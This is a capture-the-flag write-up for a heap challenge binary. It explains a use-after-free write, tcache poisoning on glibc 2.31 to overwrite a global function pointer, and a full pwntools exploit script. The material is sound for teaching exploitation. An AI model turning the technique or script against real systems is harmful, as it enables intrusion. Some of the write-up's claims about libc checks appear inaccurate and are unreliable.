### Notebook — Heap Exploitation Writeup

> x Exam (58)

### Challenge Overview and Binary Reconnaissance

The Notebook challenge presents a heap menu binary managing an array of up to eight raw note buffers, each of fixed size `NOTE_SIZE = 0x60` (96 bytes). Unlike the preceding Recycler challenge, there is no struct with an embedded function pointer: the note slots are plain `char *` pointers. The exploitation target is a standalone global function pointer `global_handler` declared in `.bss`, which is called directly by the `trigger` primitive. The technique is **tcache poisoning**: overwriting the `fd` field of a freed chunk to redirect a subsequent `malloc` to an attacker-chosen address in `.bss`, then writing `win`'s address into `global_handler` through the poisoned allocation.

```bash
checksec --file ./notebook
```

```
NX:      enabled
PIE:     disabled    ← all binary addresses fixed at compile time
Canary:  enabled
RELRO:   partial
```

```bash
nm ./notebook | grep -E "global_handler|notes"
# 00000000004040c0 B global_handler
# 00000000004040e0 b notes
```

`global_handler` sits at `0x4040c0`, which is 16-byte aligned (`0x4040c0 % 16 == 0`), satisfying the tcache alignment guard present in the target libc. No alignment adjustment is required. Because PIE is disabled, both `win` and `global_handler` are fixed-address compile-time constants readable directly from the symbol table.

**Important:** the challenge ships a pinned `libc.so.6` (glibc 2.31). The remote Docker container loads this libc automatically. Local testing against the unpinned system libc (glibc 2.35 or later) fails with SIGABRT because newer versions enforce additional heap bounds checks that reject `.bss` addresses returned from the tcache. The exploit must be tested locally either via `pwninit` or by launching the binary through the pinned loader directly.

### Vulnerability Identification

Reading `main.c` reveals four primitives of interest. **create** (case 1) calls `malloc(NOTE_SIZE)` and reads 96 bytes into the returned buffer under the prompt `data:` , storing the pointer in `notes[i]`. **free** (case 2) calls `free(notes[i])` without nulling the slot, leaving a dangling pointer. **edit** (case 3) reads 96 bytes into `notes[i]` under the prompt `data:` without any liveness check, constituting a **UAF write** when the slot is dangling. **trigger** (case 5) calls `global_handler("hello")` if `global_handler` is non-null.

The attack surface is a free-without-null combined with the unrestricted edit primitive, forming a UAF write directly into a freed chunk's `fd` field while it sits in the tcache.

### Tcache Poisoning and the Count Constraint

On glibc 2.31, tcache poisoning requires freeing **two** chunks of the target size class before performing the UAF write. The reason is the count guard in `__libc_malloc`:

```c
if (tc_idx < mp_.tcache_bins && tcache && tcache->counts[tc_idx] > 0)
    return tcache_get (tc_idx);
```

With only one freed chunk, after the first `malloc` pops it the count reaches zero and all subsequent `malloc` calls of that size bypass the tcache entirely, never reaching the poisoned entry. With two freed chunks, the first pop reduces the count to one, leaving it strictly above zero so the second pop successfully returns the poisoned address.

The UAF write targets the **head** of the tcache list (the most recently freed chunk, chunk B), not the tail. Poisoning B's `fd` with `&global_handler` means the first pop consumes B and places `&global_handler` as the new head with count one, allowing the second pop to return it.

### Heap and `.bss` Timeline

```
create(0)      →  chunk A,  notes[0] = A
create(1)      →  chunk B,  notes[1] = B

free_item(0)   →  tcache[0x70]: count=1, head=A, A->fd=NULL
free_item(1)   →  tcache[0x70]: count=2, head=B, B->fd=A

edit(1, ...)   →  UAF write through dangling notes[1] = B (the HEAD)
                   B->fd = 0x4040c0 (&global_handler)
                   tcache[0x70]: count=2, head=B, B->fd=0x4040c0

create(2)      →  pops B: count=1, head=0x4040c0
                   notes[2] = B  (valid heap chunk, send padding)

create(3, WIN) →  count=1 > 0  →  tcache consulted
                   pops 0x4040c0: notes[3] = &global_handler
                   read() writes p64(WIN) into 0x4040c0  →  global_handler = win

trigger()      →  global_handler("hello")  =  win("hello")  →  flag
```

### Final Exploit

```python
#!/usr/bin/env python3
from pwn import *

context.binary = elf = ELF('./notebook', checksec=False)

def conn():
    if args.REMOTE:
        return remote('offsec.m0lecon.it', 13505)
    return process(
        ['./ld-linux-x86-64.so.2', '--library-path', '.', './notebook']
    )

p = conn()

NOTE_SIZE = 0x60

def create(idx, data=b'A' * NOTE_SIZE):
    p.sendlineafter(b'> ',      b'1')
    p.sendlineafter(b'index: ', str(idx).encode())
    p.sendafter(b'data: ',      data[:NOTE_SIZE].ljust(NOTE_SIZE, b'\x00'))

def free_item(idx):
    p.sendlineafter(b'> ',      b'2')
    p.sendlineafter(b'index: ', str(idx).encode())

def edit(idx, data):
    p.sendlineafter(b'> ',      b'3')
    p.sendlineafter(b'index: ', str(idx).encode())
    p.sendafter(b'data: ',      data[:NOTE_SIZE].ljust(NOTE_SIZE, b'\x00'))

def trigger():
    p.sendlineafter(b'> ',      b'5')

WIN            = elf.sym.win
GLOBAL_HANDLER = elf.sym.global_handler
TARGET         = GLOBAL_HANDLER & ~0xf    # 0x4040c0 — already aligned
OFFSET         = GLOBAL_HANDLER - TARGET  # 0

create(0)                                  # chunk A
create(1)                                  # chunk B

free_item(0)                               # tcache[0x70]: count=1, head=A
free_item(1)                               # tcache[0x70]: count=2, head=B, B->fd=A

# UAF write through dangling notes[1] = B (HEAD): poison B->fd → &global_handler
edit(1, p64(TARGET) + b'\x00' * (NOTE_SIZE - 8))

create(2)                                  # pops B: count=1, head=&global_handler
create(3, b'\x00' * OFFSET + p64(WIN) + b'\x00' * (NOTE_SIZE - OFFSET - 8))
                                           # pops &global_handler, writes WIN into it

trigger()                                  # global_handler("hello") → win() → flag

print(p.recvall(timeout=2).decode(errors='replace'))
```

### Execution

```bash
# Local (pinned libc via loader)
FLAG=flag{test} python3 solve.py

# Remote
python3 solve.py REMOTE
```

> **Key takeaway:** Tcache poisoning on glibc 2.31 reduces to three observations: the `fd` field is a plain unencoded pointer (no safe-linking), the count guard requires at least one additional real freed chunk ahead of the poisoned entry in the list so that the count remains above zero when the target address is popped, and the target address must be 16-byte aligned to pass the `aligned_OK` guard. The libc version is not an academic detail — it determines whether the attack is possible at all, and running against the wrong libc is indistinguishable from a logic error in the exploit until the exact glibc version in use is confirmed.